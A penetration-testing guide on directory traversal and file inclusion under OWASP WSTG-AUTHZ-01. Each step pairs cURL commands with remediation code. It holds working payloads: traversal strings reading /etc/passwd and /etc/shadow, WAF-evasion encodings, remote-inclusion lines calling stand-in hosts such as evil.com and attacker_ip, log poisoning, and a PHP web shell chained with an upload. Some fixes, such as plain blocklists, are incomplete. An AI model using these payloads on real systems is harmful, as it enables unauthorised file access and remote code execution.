# Testing for Directory Traversal & File Include

## Overview

Testing for Directory Traversal & File Include involves verifying that the application prevents unauthorized access to files or directories through directory traversal or file inclusion vulnerabilities. According to OWASP (WSTG-AUTHZ-01), vulnerabilities such as accessing sensitive files (e.g., `/etc/passwd`), remote file inclusion (RFI), local file inclusion (LFI), or source code disclosure can allow attackers to extract sensitive data, execute malicious code, or escalate to remote code execution (RCE) through exploit chaining. This test focuses on evaluating input validation, path sanitization, access controls, WAF evasion, and post-exploitation risks across query parameters, cookies, headers, and server logs.

**Impact**: Directory traversal and file inclusion vulnerabilities can lead to:
- Exposure of sensitive system files (e.g., configuration files, user data).
- Execution of malicious code via RFI, LFI, or RCE.
- Source code disclosure, enabling further attacks.
- Session hijacking or log poisoning through post-exploitation.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide provides a practical, hands-on methodology for testing directory traversal and file inclusion vulnerabilities, adhering to OWASP’s WSTG-AUTHZ-01, with detailed tool setups, specific commands, automation scripts, WAF evasion techniques, post-exploitation scenarios, exploit chaining, remediation strategies, and ethical considerations for professional penetration testing. **Ethical Note**: Obtain explicit permission for testing, as sending traversal payloads, accessing files, or simulating exploits may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing directory traversal and file inclusion vulnerabilities, with setup and configuration instructions:

- **Burp Suite Community Edition**: Intercepts and fuzzes requests to test traversal and inclusion payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
  - Enable “Intercept” in Proxy tab.

- **cURL**: Sends requests to test traversal, inclusion, and WAF evasion payloads.
  - Install on Linux:
    ```bash
    sudo apt install curl
    ```
  - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).

- **Dirsearch**: Enumerates directories and files to identify traversal targets.
  - Install on Linux:
    ```bash
    git clone https://github.com/maurosoria/dirsearch.git
    cd dirsearch
    pip install -r requirements.txt
    ```
  - Run: `python3 dirsearch.py -u <target>`.

- **grep**: Searches source code for unsafe file operations (gray-box testing).
  - Install on Linux: Pre-installed.
  - Install on Windows: Use Git Bash or WSL.

- **Python with Requests**: Automates traversal and inclusion testing.
  - Install: `pip install requests`.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-AUTHZ-01, enhanced with automation, WAF evasion, post-exploitation, and exploit chaining for comprehensive testing.

### 1. Test Basic Directory Traversal via Query Parameter with cURL

**Objective**: Ensure query parameters cannot be used to access unauthorized files via directory traversal.

**Steps**:
1. Identify a file parameter in the application (e.g., `item` in `getUserProfile.jsp`).
2. Test traversal by requesting a sensitive file:
   ```bash
   curl -i "http://example.com/getUserProfile.jsp?item=../../../../etc/passwd"
   ```
3. Test with a different sensitive file:
   ```bash
   curl -i "http://example.com/getUserProfile.jsp?item=../../../../etc/shadow"
   ```
4. Analyze responses; expected secure response blocks the request with an error.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Access Denied</h1>
<p>You are not authorized to access this resource.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Whitelist file names (Python/Flask):
  ```python
  @app.get('/get_file')
  def get_file():
      filename = request.args.get('item')
      allowed_files = ['profile.html', 'settings.html']
      if filename not in allowed_files:
          return jsonify({'error': 'Invalid file'}), 403
      return send_file(f'Uploads/{filename}')
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 2. Test Traversal via Cookie Value with cURL

**Objective**: Ensure cookie values cannot be manipulated for directory traversal.

**Steps**:
1. Identify a cookie used for file access (e.g., `PSTYLE`).
2. Test traversal by injecting a malicious cookie value:
   ```bash
   curl -i -H "Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd" http://example.com/
   ```
3. Test with another sensitive file:
   ```bash
   curl -i -H "Cookie: USER=1826cc8f:PSTYLE=../../../../etc/shadow" http://example.com/
   ```
4. Analyze responses; expected secure response blocks the request with an error.

**Example Secure Response**:
```
HTTP/1.1 400 Bad Request
Content-Type: text/html
<h1>Invalid Cookie</h1>
<p>The provided cookie is invalid or has been tampered with.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Sanitize cookie inputs (Node.js):
  ```javascript
  app.get('/', (req, res) => {
      const pstyle = req.cookies.PSTYLE;
      if (pstyle && !/^[a-zA-Z0-9_-]+$/.test(pstyle)) {
          return res.status(400).json({ error: 'Invalid cookie value' });
      }
      res.send('Success');
  });
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 3. Test Remote File Inclusion (RFI) with cURL

**Objective**: Ensure the application prevents inclusion of remote files.

**Steps**:
1. Identify a file parameter vulnerable to inclusion (e.g., `file` in `index.php`).
2. Test RFI by including a remote file:
   ```bash
   curl -i "http://example.com/index.php?file=http://evil.com/shell.txt"
   ```
3. Test with another remote file:
   ```bash
   curl -i "http://example.com/index.php?file=http://malicious.com/script.php"
   ```
4. Analyze responses; expected secure response blocks external URLs.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Access Denied</h1>
<p>External file inclusion is disabled on this server.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
<h1>Shell Command Output</h1>
<pre><?php echo "Hello from remote file"; ?></pre>
```

**Remediation**:
- Disable remote includes (PHP):
  ```php
  <?php
  ini_set('allow_url_include', 'Off');
  $file = $_GET['file'];
  if (filter_var($file, FILTER_VALIDATE_URL)) {
      http_response_code(403);
      echo json_encode(['error' => 'External URLs not allowed']);
      exit;
  }
  ?>
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 4. Test Local File Inclusion (LFI) via Protocol with cURL

**Objective**: Ensure the application prevents LFI via protocol handlers.

**Steps**:
1. Identify a file parameter vulnerable to LFI (e.g., `file` in `index.php`).
2. Test LFI using a protocol handler:
   ```bash
   curl -i "http://example.com/index.php?file=file:///etc/passwd"
   ```
3. Test with another sensitive file:
   ```bash
   curl -i "http://example.com/index.php?file=file:///etc/shadow"
   ```
4. Analyze responses; expected secure response blocks protocol-based requests.

**Example Secure Response**:
```
HTTP/1.1 404 Not Found
Content-Type: text/html
<h1>File Not Found</h1>
<p>The requested file could not be included.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Prevent protocol handlers (Python/Flask):
  ```python
  @app.get('/include')
  def include_file():
      filename = request.args.get('file')
      if filename.startswith('file://'):
          return jsonify({'error': 'Protocol handlers not allowed'}), 403
      return send_file(f'Uploads/{filename}')
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 5. Test Path Traversal via Encoding and WAF Evasion with cURL

**Objective**: Ensure encoded traversal sequences and WAF bypass attempts are blocked.

**Steps**:
1. Identify a file parameter vulnerable to traversal (e.g., `item` in `getUserProfile.jsp`).
2. Test encoded traversal:
   ```bash
   curl -i "http://example.com/getUserProfile.jsp?item=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   ```
3. Test double-encoded traversal (WAF bypass):
   ```bash
   curl -i "http://example.com/getUserProfile.jsp?item=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
   ```
4. Test UTF-8 variant traversal (WAF bypass):
   ```bash
   curl -i "http://example.com/getUserProfile.jsp?item=..%c0%af..%c0%afetc%c0%afpasswd"
   ```
5. Test backend rewrite headers:
   ```bash
   curl -i -H "X-Original-URL: /getUserProfile.jsp?item=../../../../etc/passwd" http://example.com/
   ```
   ```bash
   curl -i -H "X-Rewrite-URL: /getUserProfile.jsp?item=../../../../etc/passwd" http://example.com/
   ```
6. Analyze responses; expected secure response rejects encoded sequences and rewrite headers.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Invalid Request</h1>
<p>The file path contains illegal characters.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Normalize input and block rewrite headers (Node.js):
  ```javascript
  const path = require('path');
  app.get('/get_file', (req, res) => {
      if (req.get('X-Original-URL') || req.get('X-Rewrite-URL')) {
          return res.status(403).json({ error: 'Rewrite headers not allowed' });
      }
      const file = decodeURIComponent(req.query.item);
      const safePath = path.normalize(file).replace(/^(\.\.[\/\\])+/, '');
      if (safePath.includes('..') || /[\u0080-\uFFFF]/.test(file)) {
          return res.status(403).json({ error: 'Invalid file path' });
      }
      res.sendFile(path.join(__dirname, 'Uploads', safePath));
  });
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 6. Test Windows-Specific Path Traversal with cURL

**Objective**: Ensure Windows-specific traversal sequences are blocked.

**Steps**:
1. Identify a file parameter vulnerable to traversal (e.g., `file` in `index.php`).
2. Test Windows traversal:
   ```bash
   curl -i "http://example.com/index.php?file=..\\..\\boot.ini"
   ```
3. Test alternate traversal:
   ```bash
   curl -i "http://example.com/index.php?file=....//....//boot.ini"
   ```
4. Analyze responses; expected secure response blocks backslash-based requests.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Invalid Request</h1>
<p>The file path is not valid for this resource.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
```

**Remediation**:
- Block backslashes (Python/Flask):
  ```python
  @app.get('/get_file')
  def get_file():
      filename = request.args.get('file')
      if '\\' in filename:
          return jsonify({'error': 'Backslashes not allowed'}), 403
      return send_file(f'Uploads/{filename}')
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 7. Test Source Code Disclosure (LFI without Traversal) with cURL

**Objective**: Ensure the application does not expose source code via LFI.

**Steps**:
1. Identify a file parameter that includes scripts (e.g., `home` in `main.cgi`).
2. Test source code disclosure:
   ```bash
   curl -i "http://example.com/main.cgi?home=main.cgi"
   ```
3. Test another script:
   ```bash
   curl -i "http://example.com/main.cgi?home=index.php"
   ```
4. Analyze responses; expected secure response executes the script without exposing code.

**Example Secure Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
<h1>Welcome</h1>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
<h1>Source Code</h1>
<pre>
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<html><body><h1>Welcome</h1></body></html>";
</pre>
```

**Remediation**:
- Restrict inclusions (PHP):
  ```php
  <?php
  $file = $_GET['home'];
  $allowed = ['index.html', 'about.html'];
  if (!in_array($file, $allowed)) {
      http_response_code(403);
      echo json_encode(['error' => 'Invalid file']);
      exit;
  }
  include "Pages/$file";
  ?>
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 8. Test UNC Path Inclusion (Windows/SMB) with cURL

**Objective**: Ensure the application blocks UNC path inclusion.

**Steps**:
1. Identify a file parameter vulnerable to inclusion (e.g., `file` in `index.php`).
2. Test UNC path inclusion:
   ```bash
   curl -i "http://example.com/index.php?file=\\\\attacker_ip\\share\\malware.php"
   ```
3. Test another UNC path:
   ```bash
   curl -i "http://example.com/index.php?file=\\\\malicious_ip\\share\\script.txt"
   ```
4. Analyze responses; expected secure response blocks UNC paths.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Error</h1>
<p>Access to UNC paths is blocked.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
<h1>Malicious File Inclusion</h1>
<p>Connecting to SMB server...</p>
```

**Remediation**:
- Block UNC paths (Node.js):
  ```javascript
  app.get('/include', (req, res) => {
      const file = req.query.file;
      if (file.startsWith('\\\\')) {
          return res.status(403).json({ error: 'UNC paths not allowed' });
      }
      res.sendFile(path.join(__dirname, 'Uploads', file));
  });
  ```

**Tip**: Save cURL commands and responses to a file (e.g., `curl -i ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 9. Test File Inclusion Functions (PHP) Gray-Box with grep

**Objective**: Identify unsafe PHP file inclusion functions in source code.

**Steps**:
1. Access the application’s source code (gray-box testing).
2. Search for unsafe include/require functions:
   ```bash
   grep -RnE "(include|require)(_once)?\s*\(.*\$_(GET|POST|COOKIE)" ./app/
   ```
3. Search for dynamic file inclusions:
   ```bash
   grep -RnE "(include|require)(_once)?\s*\(.*\$_" ./app/
   ```
4. Analyze findings; expected secure response shows no unsafe inclusions.

**Example Secure Response**:
```
(No matches found)
```

**Example Vulnerable Response**:
```
./app/index.php:45: include($_GET['file']);
```

**Remediation**:
- Use static includes (PHP):
  ```php
  <?php
  $pages = ['home' => 'Pages/home.html', 'about' => 'Pages/about.html'];
  $file = $_GET['file'];
  if (!isset($pages[$file])) {
      http_response_code(403);
      echo json_encode(['error' => 'Invalid file']);
      exit;
  }
  include $pages[$file];
  ?>
  ```

**Tip**: Save grep output to a file (e.g., `grep ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., code snippets).

### 10. Test Dangerous File Operations (Java, ASP, PHP) Gray-Box with grep

**Objective**: Identify unsafe file operations in source code.

**Steps**:
1. Access the application’s source code (gray-box testing).
2. Search for dangerous file operations:
   ```bash
   grep -RnE "File|FileReader|fopen|readfile" ./src/
   ```
3. Search for user-controlled file operations:
   ```bash
   grep -RnE "fopen|readfile.*\$_(GET|POST|COOKIE)" ./src/
   ```
4. Analyze findings; expected secure response shows no unsafe operations.

**Example Secure Response**:
```
(No matches found)
```

**Example Vulnerable Response**:
```
./src/upload.php:60: fopen($_GET['filename'], 'r');
```

**Remediation**:
- Sanitize file operations (PHP):
  ```php
  <?php
  $filename = $_GET['filename'];
  $allowed = ['data.txt', 'config.txt'];
  if (!in_array($filename, $allowed)) {
      http_response_code(403);
      echo json_encode(['error' => 'Invalid file']);
      exit;
  }
  $handle = fopen("Uploads/$filename", 'r');
  ?>
  ```

**Tip**: Save grep output to a file (e.g., `grep ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., code snippets).

### 11. Test Directory Traversal with Burp Suite Intruder

**Objective**: Identify traversal vulnerabilities by fuzzing payloads.

**Steps**:
1. Configure Burp Suite by setting up the browser proxy (127.0.0.1:8080) and adding `example.com` to the target scope.
2. Intercept a request with a file parameter:
   ```bash
   HTTP History -> Select GET /getUserProfile.jsp?item=profile -> Send to Intruder
   ```
3. Fuzz the parameter with traversal payloads:
   ```bash
   Intruder -> Payloads -> Add payloads (e.g., ../../../../etc/passwd, %2e%2e%2f%2e%2e%2fetc%2fpasswd, %252e%252e%252f%252e%252e%252fetc%252fpasswd, ..%c0%af..%c0%afetc%c0%afpasswd) -> Start Attack -> Check Response
   ```
4. Analyze responses; expected secure response blocks all payloads.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Access Denied</h1>
<p>You are not authorized to access this resource.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Sanitize paths (Python/Flask):
  ```python
  from pathlib import Path
  @app.get('/get_file')
  def get_file():
      filename = request.args.get('item')
      safe_path = Path('Uploads') / filename
      if '..' in safe_path.as_posix() or not safe_path.exists():
          return jsonify({'error': 'Invalid file path'}), 403
      return send_file(safe_path)
  ```

**Tip**: Save Burp Suite Intruder responses as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 12. Test Directory Traversal with Dirsearch for Hidden Files

**Objective**: Enumerate directories and files to identify traversal targets.

**Steps**:
1. Run Dirsearch to discover directories and files:
   ```bash
   dirsearch -u https://example.com -e php,html,txt
   ```
2. Test a discovered path with a traversal payload:
   ```bash
   curl -i "http://example.com/discovered_path?file=../../../../etc/passwd"
   ```
3. Analyze responses; expected secure response blocks traversal attempts.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Invalid Request</h1>
<p>The file path is not valid.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

**Remediation**:
- Restrict file access (Node.js):
  ```javascript
  const path = require('path');
  app.get('/get_file', (req, res) => {
      const file = req.query.item;
      const safePath = path.join(__dirname, 'Uploads', file);
      if (safePath.includes('..') || !safePath.startsWith(__dirname + '/Uploads')) {
          return res.status(403).json({ error: 'Invalid file path' });
      }
      res.sendFile(safePath);
  });
  ```

**Tip**: Save Dirsearch output to a file (e.g., `dirsearch ... > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 13. Automate Directory Traversal Testing with Python and Bash

**Objective**: Automate traversal testing for repeatability in CI/CD pipelines with JSON output.

**Steps**:
1. Create a Python script to test traversal payloads:
   ```python
   import requests
   import json
   payloads = [
       "../../../../etc/passwd",
       "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
       "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
       "..%c0%af..%c0%afetc%c0%afpasswd"
   ]
   results = []
   url = "http://example.com/getUserProfile.jsp?item="
   for payload in payloads:
       try:
           response = requests.get(url + payload, timeout=5)
           result = {
               "payload": payload,
               "status_code": response.status_code,
               "response_length": len(response.text),
               "vulnerable": response.status_code == 200 and "root:" in response.text
           }
           results.append(result)
       except Exception as e:
           results.append({"payload": payload, "error": str(e)})
   with open("traversal_report.json", "w") as f:
       json.dump(results, f, indent=2)
   ```
2. Create a Bash wrapper to invoke cURL with payloads:
   ```bash
   #!/bin/bash
   payloads=(
       "../../../../etc/passwd"
       "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
       "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
       "..%c0%af..%c0%afetc%c0%afpasswd"
   )
   echo '{"results": [' > traversal_report.json
   for i in "${!payloads[@]}"; do
       curl -s -i "http://example.com/getUserProfile.jsp?item=${payloads[i]}" > temp.txt
       status=$(head -n 1 temp.txt | cut -d' ' -f2)
       length=$(wc -c < temp.txt)
       vulnerable=$(grep -q "root:" temp.txt && echo "true" || echo "false")
       echo "{\"payload\": \"${payloads[i]}\", \"status_code\": $status, \"response_length\": $length, \"vulnerable\": $vulnerable}" >> traversal_report.json
       [ $i -lt $((${#payloads[@]}-1)) ] && echo "," >> traversal_report.json
   done
   echo "]}" >> traversal_report.json
   rm temp.txt
   ```
3. Integrate into CI/CD (e.g., GitLab CI):
   ```yaml
   stages:
     - test
   security_test:
     stage: test
     script:
       - pip install requests
       - python traversal_test.py
       - bash traversal_test.sh
     artifacts:
       paths:
         - traversal_report.json
   ```

**Remediation**:
- Ensure CI/CD pipelines fail on detected vulnerabilities to enforce fixes.

**Tip**: Save JSON reports and pipeline logs. Organize findings in a report with timestamps and evidence of vulnerabilities.

### 14. Test Post-Exploitation via LFI (Log File Inclusion and Session Hijacking)

**Objective**: Evaluate post-exploitation risks of LFI, such as log file inclusion or session hijacking.

**Steps**:
1. Identify an LFI vulnerability (e.g., `index.php?file=../../../../var/log/apache2/access.log`).
2. Test log file inclusion by injecting a malicious User-Agent (with permission):
   ```bash
   curl -i "http://example.com/index.php?file=../../../../var/log/apache2/access.log" -A "<?php phpinfo(); ?>"
   ```
3. Access the log file via LFI to execute the injected code:
   ```bash
   curl -i "http://example.com/index.php?file=../../../../var/log/apache2/access.log"
   ```
4. Test session hijacking via `/proc/self/environ`:
   ```bash
   curl -i "http://example.com/index.php?file=../../../../proc/self/environ"
   ```
5. Analyze responses; expected secure response blocks log and environment file access.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Access Denied</h1>
<p>File access restricted.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
[PHP info output or environment variables like PHPSESSID]
```

**Remediation**:
- Restrict log and system file access (PHP):
  ```php
  <?php
  $file = $_GET['file'];
  if (strpos($file, '/var/log') !== false || strpos($file, '/proc') !== false) {
      http_response_code(403);
      echo json_encode(['error' => 'System files restricted']);
      exit;
  }
  include "Pages/$file";
  ?>
  ```

**Tip**: Save cURL responses and screenshots of exploited outputs. Organize findings in a report with timestamps and evidence of vulnerabilities.

### 15. Test Exploit Chaining (File Upload + LFI to RCE)

**Objective**: Evaluate escalation from file upload and LFI to remote code execution (RCE).

**Steps**:
1. Identify a file upload endpoint (e.g., `upload.php`).
2. Upload a malicious file (with permission):
   ```bash
   curl -i -F "file=@malicious.php" http://example.com/upload.php
   ```
   Content of `malicious.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Test LFI to include the uploaded file:
   ```bash
   curl -i "http://example.com/index.php?file=../../uploads/malicious.php&cmd=whoami"
   ```
4. Analyze responses; expected secure response blocks file inclusion or execution.

**Example Secure Response**:
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
<h1>Access Denied</h1>
<p>File inclusion restricted.</p>
```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
Content-Type: text/html
www-data
```

**Remediation**:
- Validate uploads and restrict inclusions (PHP):
  ```php
  <?php
  $file = $_FILES['file']['name'];
  if (!preg_match('/\.(jpg|png|pdf)$/', $file)) {
      http_response_code(403);
      echo json_encode(['error' => 'Invalid file type']);
      exit;
  }
  move_uploaded_file($_FILES['file']['tmp_name'], "Uploads/$file");
  ?>
  ```

**Tip**: Save cURL responses and screenshots of RCE outputs. Organize findings in a report with timestamps and evidence of vulnerabilities.
